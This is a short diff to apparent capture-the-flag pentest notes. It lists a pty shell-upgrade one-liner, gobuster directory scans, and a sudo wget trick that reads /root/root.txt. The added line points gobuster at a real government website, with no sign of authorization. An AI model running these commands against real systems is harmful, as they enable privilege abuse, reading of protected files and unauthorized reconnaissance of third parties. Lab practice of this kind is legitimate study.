@@ -11,6 +11,8 @@ python3 -c 'import pty; pty.spawn("/bin/sh")'
 
 gobuster dir --url https://10.129.240.189 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
 
+go buster status code : `gobuster dir -u https://www.jmicc.gov.pk/ -w /usr/share/wordlists/dirb/common.txt -b '403,404'`
+
 using wget to reveal the text as /root/root
 
 sudo wget --input-file /root/root.txt
